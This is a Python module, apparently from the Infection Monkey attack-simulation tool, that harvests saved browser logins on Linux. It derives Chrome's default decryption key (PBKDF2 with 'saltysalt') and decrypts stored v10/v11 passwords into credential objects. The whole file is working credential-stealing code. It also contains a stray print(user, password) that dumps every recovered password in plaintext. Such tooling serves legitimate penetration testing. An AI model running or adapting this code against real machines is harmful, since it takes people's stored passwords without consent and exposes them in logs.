import logging
from hashlib import pbkdf2_hmac
from itertools import chain
from pathlib import Path
from typing import Callable, Collection, Iterable, Iterator, Optional, Tuple

from common.credentials import Credentials, EmailAddress, Password, Username
from common.types import Event
from infection_monkey.utils.threading import interruptible_iter

from .browser_credentials_database_path import BrowserCredentialsDatabasePath
from .decrypt import decrypt_AES, decrypt_v80
from .linux_credentials_database_selector import DEFAULT_MASTER_KEY


logger = logging.getLogger(__name__)

AES_BLOCK_SIZE = 16
AES_INIT_VECTOR = b" " * 16

DatabaseReader = Callable[[Path], Iterator[Tuple[str, bytes]]]


class LinuxCredentialsDatabaseProcessor:
    def __init__(self, read_login_data_from_database: DatabaseReader):
        self._read_login_data_from_database = read_login_data_from_database

    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        self._decryption_key = pbkdf2_hmac(
            hash_name="sha1",
            password=DEFAULT_MASTER_KEY,
            salt=b"saltysalt",
            iterations=1,
            dklen=16,
        )
        credentials = chain.from_iterable(map(self._process_database_paths, database_paths))
        return list(interruptible_iter(credentials, interrupt))

    def _process_database_paths(
        self, database_path: BrowserCredentialsDatabasePath
    ) -> Iterator[Credentials]:
        login_data = self._read_login_data_from_database(database_path.database_file_path)
        yield from self._process_login_data(login_data)

    def _process_login_data(self, login_data: Iterable[Tuple[str, bytes]]) -> Iterator[Credentials]:
        for user, password in login_data:
            try:
                print(user, password)
                yield Credentials(
                    identity=self._get_identity(user), secret=self._get_password(password)
                )
            except Exception:
                continue

    def _get_identity(self, user: str):
        try:
            return EmailAddress(email_address=user)
        except ValueError:
            return Username(username=user)

    def _get_password(self, password: bytes) -> Optional[Password]:
        if self._password_is_encrypted(password):
            try:
                return Password(password=self._decrypt_password(password))
            except Exception:
                return None

        return Password(password=password)

    def _password_is_encrypted(self, password: bytes):
        return password[:3] == b"v10" or password[:3] == b"v11"

    def _decrypt_password(self, password: bytes) -> str:
        try:
            decrypted_password = self._chrome_decrypt(password, self._decryption_key)
            if decrypted_password != "":
                return decrypted_password

        except Exception:
            logger.exception("Failed to decrypt password")
            raise

        # If we get here, we failed to decrypt the password
        raise Exception("Password could not be decrypted.")

    def _chrome_decrypt(self, encrypted_value: bytes, key: bytes) -> str:
        try:
            return decrypt_AES(encrypted_value, key, AES_INIT_VECTOR, AES_BLOCK_SIZE)
        except UnicodeDecodeError:
            pass

        try:
            return decrypt_v80(encrypted_value, key)
        except UnicodeDecodeError:
            pass

        return ""
